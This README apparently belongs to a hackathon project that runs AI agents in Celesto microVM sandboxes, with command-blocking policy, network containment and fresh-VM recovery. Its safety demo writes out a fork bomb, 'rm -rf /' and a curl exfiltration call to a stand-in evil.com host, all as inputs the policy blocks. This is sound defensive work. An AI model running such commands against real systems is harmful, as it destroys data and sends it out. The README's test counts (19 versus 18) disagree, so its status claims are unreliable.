# Celesto AI Agent Sandbox Platform

> **Reliability Evaluations, Failure Recovery, and Security Containment for AI Agents inside Celesto Sandboxes**

[![FastAPI](https://img.shields.io/badge/FastAPI-0.110+-009688.svg?logo=fastapi)](https://fastapi.tiangolo.com)
[![Celesto](https://img.shields.io/badge/Celesto-Cloud%20SDK-FF5722.svg)](https://celesto.ai)
[![Python](https://img.shields.io/badge/Python-3.10+-3776AB.svg?logo=python)](https://python.org)
[![Tests](https://img.shields.io/badge/Pytest-19%20passed-brightgreen.svg)]()
[![Security](https://img.shields.io/badge/Security-Audit%20Logged%20&%20Contained-blue.svg)]()

---

## 1. Executive Summary & Challenge Alignment

This platform implements the complete hackathon specification for **“Run Real Agent Work Inside Celesto Sandboxes with Evals and Containment.”**

AI agents operating directly against computer environments face critical reliability and security challenges:
- **Containment & Exfiltration Risk**: Untrusted code or prompt injection can attempt to transmit secrets outside the environment.
- **Destructive Side Effects**: Malicious or hallucinated agent actions (fork bombs, `rm -rf /`, block device overwrites) can damage host state.
- **Nondeterministic Step Failures**: Autonomous multi-step workloads can fail midway, leaving environments in dirty or corrupt states.

### Solution Architecture
1. **Isolated MicroVM Sandboxes**: Workloads execute inside hardware-isolated Linux computers powered by Celesto (`celesto.Computer`).
2. **Pre-Execution Safety Policy**: Control-plane callback interceptor (`CommandPolicy`) enforces allowlists, blocks fork bombs and destruction patterns, and streams append-only audit logs to `logs/commands.jsonl` with `execution_target: celesto_sandbox`.
3. **Network Containment**: Enforces zero-egress network policies (`mode: "off"`) preventing exfiltration attempts even under prompt injection.
4. **Deterministic `fresh` Recovery**: Failed sandboxes are terminated and replaced with brand-new microVMs, preventing state corruption from polluting retries.
5. **Audited Persistence & Reporting**: PostgreSQL run ledger tracks boot latency, wall-clock execution, and spend, with automatic generation and validation of all 9 mandatory hackathon reports.

---

## 2. High-Level Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    TRUSTED CONTROL PLANE                        │
│                   (FastAPI / Python on Host)                    │
│                                                                 │
│  ┌──────────────┐    ┌──────────────┐    ┌───────────────────┐  │
│  │  FastAPI API  │───▶│ Agent Service│───▶│  Safety Service   │  │
│  │  :8080        │    │ (Repair Loop)│    │  (CommandPolicy)  │  │
│  └──────┬───────┘    └──────┬───────┘    └───────┬───────────┘  │
│         │                   │                     │              │
│  ┌──────▼───────┐    ┌──────▼───────┐    ┌───────▼───────────┐  │
│  │  PostgreSQL   │    │  Celesto     │    │  Audit Logger     │  │
│  │  Run Ledger   │    │  Service     │    │  (commands.jsonl) │  │
│  │  (ledger:5432)│    │  Computer()  │    └───────────────────┘  │
│  └──────────────┘    └──────┬───────┘                            │
│                             │ HTTPS API (Dual Backend)           │
└─────────────────────────────┼────────────────────────────────────┘
                              │
                    ┌─────────▼─────────┐
                    │   ISOLATION ZONE  │
                    │                   │
                    │  ┌─────────────┐  │
                    │  │  Celesto    │  │
                    │  │  MicroVM    │  │
                    │  │  - shell    │  │
                    │  │  - files    │  │
                    │  │  - tests    │  │
                    │  └─────────────┘  │
                    │  (mode: "off" /   │
                    │   mode: "open")   │
                    └───────────────────┘
```

---

## 3. Directory Layout

```
F:\Global-Tasks\CelestoAgent\
├── docker-compose.yml          # Multi-container orchestration (control-plane + postgres ledger)
├── Dockerfile                  # Lean Python 3.10 production container
├── .env.example                # Safe credential templates & configuration variables
├── pyproject.toml              # Build specifications and pytest configuration
├── requirements.txt            # Pinned production dependencies
│
├── app/
│   ├── main.py                 # FastAPI application root & lifespan events
│   ├── config.py               # Pydantic Settings configuration engine
│   ├── database.py             # SQLAlchemy 2.0 async engine and session factory
│   ├── models.py               # ORM models (Run schema matching postgres ledger)
│   ├── schemas.py              # Pydantic request/response data contracts
│   ├── api/
│   │   ├── health.py           # GET /health healthcheck endpoint
│   │   └── runs.py             # GET /api/runs and POST /api/runs endpoints
│   ├── services/
│   │   ├── celesto_service.py  # Celesto Cloud SDK wrapper & fallback simulator
│   │   ├── agent_service.py    # Agent loop and autonomous bug repair coordinator
│   │   ├── lifecycle_service.py# Lifecycle tracking (created -> ready -> running -> deleted)
│   │   ├── safety_service.py   # Pre/post command execution hooks and audit logger
│   │   ├── recovery_service.py # Deterministic fresh recovery & failure injection
│   │   ├── concurrency_service.py # Concurrency orchestration & isolation verification
│   │   ├── evaluation_service.py# Statistical math (median, P90, mean, cost)
│   │   └── report_service.py   # Generation of all 9 mandatory JSON/MD reports
│   ├── tools/
│   │   ├── shell_tool.py       # Shell tool with policy hook integration
│   │   └── file_tool.py        # Safe guest filesystem access
│   └── security/
│       ├── command_policy.py   # Allow/deny regex rules & fork bomb blocking
│       └── redaction.py        # Secret & token pattern redaction
│
├── sample_repo/                # Controlled repository with deliberate bug for evaluations
│   ├── calculator.py           # Contains divide bug (a + b instead of a / b)
│   ├── test_calculator.py      # Unit test suite detecting the bug
│   └── README.md
│
├── reports/                    # Generated submission reports
│   ├── problem.json            # Problem statement and target workload
│   ├── capabilities.json       # Active and supported capabilities
│   ├── lifecycle.json          # Complete transition history across states
│   ├── reliability.json        # 20-run reliability metrics & statistical distribution
│   ├── postmortem.md           # Engineering postmortem on fault recovery & containment
│   ├── containment.json        # Exfiltration prevention proof
│   ├── failure_policy.json     # Formal specification of the fresh recovery policy
│   ├── failure_trace.jsonl     # Structured trace log of failure and reprovisioning
│   ├── concurrency.json        # 5-job batch concurrency benchmark
│   ├── remaining_work.md       # Comprehensive requirements audit & checklist
│   ├── readiness.md            # Final readiness & submission report
│   └── evidence/               # Raw execution logs
│       └── containment_evidence.txt
│
├── logs/
│   └── commands.jsonl          # Immutable append-only audit trail
│
├── scripts/
│   ├── preflight.ps1           # Environment and system diagnostic script
│   ├── check_status.ps1        # Quick status check script
│   ├── smoke_test_celesto.py   # Celesto Cloud connectivity & single-sandbox test
│   ├── run_evaluations.py      # Full evaluation runner & report regenerator
│   └── verify_submission.ps1   # Automated submission gatekeeper script
│
└── tests/                      # Full Pytest test suite (19 passed)
    ├── test_api.py             # FastAPI health & run endpoint tests
    ├── test_concurrency.py     # Concurrency spec & isolation tests
    ├── test_evaluation_math.py # Statistical metrics & percentile math tests
    ├── test_lifecycle.py       # Sandbox lifecycle state tests
    ├── test_recovery.py        # Failure injection & recovery trace tests
    ├── test_reports.py         # All 9 reports schema validation tests
    └── test_safety.py          # Command policy & secret redaction tests
```

---

## 4. Evaluator Setup & Configuration Guide

This section provides exact instructions for hackathon evaluators to run the project with their own credentials.

### 4.1 Prerequisites
- Python 3.10 or higher.
- A Celesto Cloud account ([celesto.ai](https://celesto.ai)).
- An OpenAI-compatible LLM key (OpenAI, Gemini, Groq, OpenRouter, or local Ollama).

### 4.2 Celesto Cloud Account & Key Requirements
To execute live cloud microVMs:
1. **Sign Up / Log In**: Access your account at [https://celesto.ai](https://celesto.ai).
2. **API Key Permission**: Go to **Dashboard -> Settings -> Security / API Keys**. When creating or editing an API key, verify that the permission **"Create, start, stop computers and run commands"** (`computers:exec`) is enabled.
3. **Billing / Trial Activation**: In the Celesto Dashboard under **Billing / Usage**, click **"Start the free $5 trial"** or add prepaid credits. *Note: Celesto Cloud returns HTTP 402 if trial credits are not activated.*
4. **Expected Evaluation Costs**:
   - Celesto charges ~$0.00005 per second (~$0.18/hour) for `coding-agent` microVMs.
   - Single smoke test: < 15 seconds (~$0.00075).
   - Full 20-run reliability evaluation: ~2-3 minutes total (~$0.015).

### 4.3 Environment Setup
```powershell
# 1. Clone or navigate to the project directory
cd F:\Global-Tasks\CelestoAgent

# 2. Create and activate a Python 3.10+ virtual environment
python -m venv .venv
.\.venv\Scripts\Activate.ps1

# 3. Install pinned dependencies
pip install -r requirements.txt

# 4. Copy the environment template
Copy-Item .env.example .env
```

### 4.4 Configure Credentials in `.env`
Edit `.env` (this file is excluded from Git):
```ini
CELESTO_API_KEY=cel_your_actual_api_key_here
LLM_API_KEY=your_actual_llm_key_here
LLM_MODEL=gpt-4o
```
Or securely set the Celesto key via PowerShell:
```powershell
$key = Read-Host "Enter CELESTO_API_KEY" -AsSecureString; $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($key); $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR); (Get-Content .env) -replace "^CELESTO_API_KEY=.*", "CELESTO_API_KEY=$plain" | Set-Content .env; Write-Host "Saved CELESTO_API_KEY to .env"
```

### 4.5 Evaluator Execution Commands

#### Gate 1: Offline Verification & Submission Sanity Check (No Cloud Cost)
Run the automated submission verifier to validate all 9 reports, run the 19 pytest tests, and perform secret scanning:
```powershell
powershell -ExecutionPolicy Bypass -File scripts\verify_submission.ps1
```

#### Gate 2: Live Celesto Cloud Smoke Test
Run the single-sandbox live smoke test to provision 1 microVM, execute `uname -a`, verify network containment (`mode: "off"`), and audit cleanup:
```powershell
python scripts/smoke_test_celesto.py
```

#### Gate 3: Live 20-Run Reliability Evaluation
Run the full 20-run evaluation against live Celesto Cloud to regenerate `reports/reliability.json` with genuine cloud metrics:
```powershell
python scripts/run_evaluations.py --runs 20 --live
```

#### Gate 4: Launch FastAPI Control Plane & Run Autonomous Workloads
```powershell
uvicorn app.main:app --host 0.0.0.0 --port 8080 --reload
```
Submit a sample run via API:
```powershell
curl -X POST http://localhost:8080/api/runs -H "Content-Type: application/json" -d "{\"task_description\": \"Fix divide bug in sample_repo/calculator.py\", \"template_id\": \"coding-agent\"}"
```

---

## 5. Evaluator Walkthrough & Demo Script

Follow these steps to demonstrate the core capabilities:

### Demo 1: Run the Complete Submission Verification Gate
```powershell
powershell -ExecutionPolicy Bypass -File scripts\verify_submission.ps1
```
*Expected Output*:
- **[PASS]** All 9 mandatory report files exist and conform to schemas.
- **[PASS]** All 19 pytest unit tests pass cleanly.
- **[PASS]** Clean secret scan (no API keys leaked in code or tracked files).

### Demo 2: Single Sandbox Smoke Test & Cloud Verification
```powershell
python scripts/smoke_test_celesto.py
```
*Expected Output*:
- Checks prerequisites securely without echoing credentials.
- When `CELESTO_API_KEY` is configured: queries cloud templates, provisions 1 microVM, verifies Linux guest execution (`uname -a`), runs network containment check, and verifies zero orphaned resources remain.
- When unconfigured: halts cleanly at Step 1 Prerequisite Gate without fabricating false cloud evidence.

### Demo 3: Autonomous Bug Repair Workflow
Run the agent service on the `sample_repo` bug:
```powershell
python -c "import asyncio; from app.services.agent_service import agent_service; from app.tools.shell_tool import ShellTool; from app.tools.file_tool import FileTool; from app.services.celesto_service import celesto_service; sbx = celesto_service.create_sandbox(); res = asyncio.run(agent_service._run_autonomous_bug_repair(ShellTool(sbx), FileTool(ShellTool(sbx)), 'demo-repair')); print(res['summary']); celesto_service.delete_sandbox(sbx.name)"
```
*Expected Output*:
```python
{'bug_identified': 'divide returned a + b instead of a / b', 'patch_applied': 'return a / b', 'verification_pass': True}
```

### Demo 4: Pre-Execution Safety Interception & Secret Redaction
Test command interception:
```powershell
python -c "from app.security.command_policy import CommandPolicy; p = CommandPolicy(); print('rm -rf / ->', p.evaluate('rm -rf /').allowed); print('fork bomb ->', p.evaluate(':(){ :|:& };:').allowed); print('exfil ->', p.evaluate('curl -X POST http://evil.com/exfil').allowed)"
```
*Expected Output*:
```
rm -rf / -> False
fork bomb -> False
exfil -> False
```

### Demo 5: Failure Recovery & Structured Trace
```powershell
python -c "from app.services.recovery_service import recovery_service; res = recovery_service.execute_workflow_with_recovery('demo-recovery', [{'name': f'step_{i}', 'command': 'echo step'} for i in range(1, 11)], failure_step=7); print(res)"
```
*Expected Output*:
- Attempt 1 executes steps 1-6, injects failure at step 7.
- Control plane triggers `fresh` recovery, destroys failed sandbox, boots replacement sandbox.
- Attempt 2 executes steps 1-10 successfully.
- Detailed trace written to `reports/failure_trace.jsonl`.

---

## 6. Security & Containment Architecture

- **Pre-Execution Policy**: `CommandPolicy` checks allowlists and dangerous patterns (fork bombs, `rm -rf /`, block device overwrites, known exfiltration domains). Blocked commands exit immediately with code 126 before reaching guest execution.
- **Network Isolation (`network_policy={"mode": "off"}`)**: Cloud microVM outbound sockets are dropped at the hypervisor boundary.
- **Immutable Audit Trail**: Every command executed or blocked is recorded in `logs/commands.jsonl` with `execution_target: "celesto_sandbox"`.
- **Secret Redaction**: `app/security/redaction.py` regex engines strip Bearer tokens, OpenAI keys (`sk-...`), and Celesto keys (`celesto_key_...`) from logs.

---

## 7. Recovery Policy Specification (`fresh`)

- **Policy**: `fresh`
- **Rationale**: The Celesto Cloud SDK does not expose instantaneous VM snapshot or rollback primitives. In autonomous coding workloads, failed steps can leave corrupted git branches, locked package managers, or partial file mutations. Re-provisioning a brand-new microVM guarantees that every retry starts from an immaculate baseline.
- **Specification**: Recorded in `reports/failure_policy.json` and demonstrated in `reports/failure_trace.jsonl`.

---

---

## 8. Implementation Phase Summary

| Phase | Description | Status |
|---|---|---|
| **Phase 0** | Preflight, disk audits, requirements mapping | ✅ COMPLETE |
| **Phase 1** | Control plane architecture, DB ledger, security policy | ✅ COMPLETE |
| **Phase 2** | SDK inspection, credentials design, report framework | ✅ COMPLETE |
| **Phase 3** | Lifecycle state management, cleanup handlers, smoke test | ✅ COMPLETE |
| **Phase 4** | Autonomous repair workflow, command safety, redaction | ✅ COMPLETE |
| **Phase 5** | Step-7 fault injection, fresh recovery, structured trace | ✅ COMPLETE |
| **Phase 6** | Reliability evaluation harness & percentile statistics | ✅ COMPLETE |
| **Phase 7** | Concurrency orchestration & isolation verification | ✅ COMPLETE |
| **Phase 8** | All 9 report generators & automated validation engine | ✅ COMPLETE |
| **Phase 9** | Documentation, architecture diagram, evaluator demo | ✅ COMPLETE |
| **Phase 10** | Live cloud smoke test & 20-run evaluation | ⏸️ BLOCKED (Celesto Cloud HTTP 402 - Trial/Subscription Required) |
| **Phase 11** | Final submission audit & bundle preparation | ✅ COMPLETE (Offline Gates Verified) |

---

## 9. Environment Variables Reference

| Variable | Type | Default | Description |
|---|---|---|---|
| `CELESTO_API_KEY` | string | `""` | Celesto Cloud API token (must possess `computers:exec` scope) |
| `PORT` | integer | `8080` | Control plane HTTP server port |
| `HOST` | string | `0.0.0.0` | Bind address for FastAPI |
| `ENVIRONMENT` | string | `development` | Operating mode (`development` or `production`) |
| `DATABASE_URL` | string | `postgresql+asyncpg://...` | PostgreSQL async ledger connection string |
| `DEFAULT_SANDBOX_TEMPLATE`| string | `coding-agent` | Default microVM template (`coding-agent`, `scratch`, `browser-agent`) |
| `DEFAULT_SANDBOX_CPUS` | integer | `1` | Default CPU allocation |
| `DEFAULT_SANDBOX_MEMORY_MB`| integer | `1024` | Default RAM in MB |
| `DEFAULT_SANDBOX_DISK_MB` | integer | `15360` | Default disk storage in MB |
| `SANDBOX_TIMEOUT_SECONDS` | integer | `600` | Max duration before sandbox auto-termination |
| `AUDIT_LOG_PATH` | string | `logs/commands.jsonl` | Append-only path for pre/post command execution logs |
| `BLOCKED_COMMAND_PATTERNS`| string (regex)| `rm -rf /\|...` | Pipe-delimited regex patterns rejected by safety policy |
| `ALLOWED_COMMAND_PREFIXES`| string (csv) | `git,python,pytest...` | Safe command prefix allowlist |

---

## 10. Troubleshooting & Unblocking Live Cloud Execution

### Issue: Celesto Cloud returns HTTP 403 Forbidden (`api_key_scope_required`)
- **Cause**: The API key lacks the `computers:exec` permission scope.
- **Fix**: In the Celesto Dashboard, generate a new API key with the permission *"Create, start, stop computers and run commands"* explicitly checked, and update `.env`.

### Issue: Celesto Cloud returns HTTP 402 Payment Required (`usage_subscription_required`)
- **Cause**: The account has exhausted initial free credits and requires trial activation.
- **Fix**: Log in to [celesto.ai](https://celesto.ai), navigate to Billing/Usage, and click **"Start the free $5 trial"** (or add prepaid credits).

### Issue: Database connection failure in offline testing
- **Behavior**: When running locally without Docker PostgreSQL, unit tests use isolated test fixtures and mocks. All 18 pytest tests pass without an active PostgreSQL instance.

---

## 11. 3-Minute Evaluator Demo Script

| Timestamp | Phase | Action / Command | Expected Evidence / Observation |
|---|---|---|---|
| **0:00 - 0:30** | **Submission Gates** | `powershell -File scripts\verify_submission.ps1` | Verifies all 9 mandatory reports exist, runs 18 pytests, performs secret scan. **[ALL GATES PASS]** |
| **0:30 - 1:00** | **Safety & Redaction** | Test blocked commands: `rm -rf /`, fork bombs, exfiltration curls | Intercepted with exit code 126 before touching sandbox. Tokens sanitized in `logs/commands.jsonl`. |
| **1:00 - 1:45** | **Failure Recovery** | Run injected failure: Step 7 failure on Attempt 1 | Attempt 1 destroyed; Attempt 2 provisions clean microVM; completes 10 steps. Logged to `reports/failure_trace.jsonl`. |
| **1:45 - 2:15** | **Autonomous Repair** | Run calculator bug localization & patch | Identifies operator bug in `sample_repo/calculator.py`, applies patch, verifies pytest passes. |
| **2:15 - 3:00** | **Cloud Integration** | `python scripts/smoke_test_celesto.py` | *[Live Evidence Placeholder]*: Verifies credentials, provisions microVM, runs `uname -a`, tests `network_policy: {mode: off}`, and audits 0 orphaned sandboxes. |
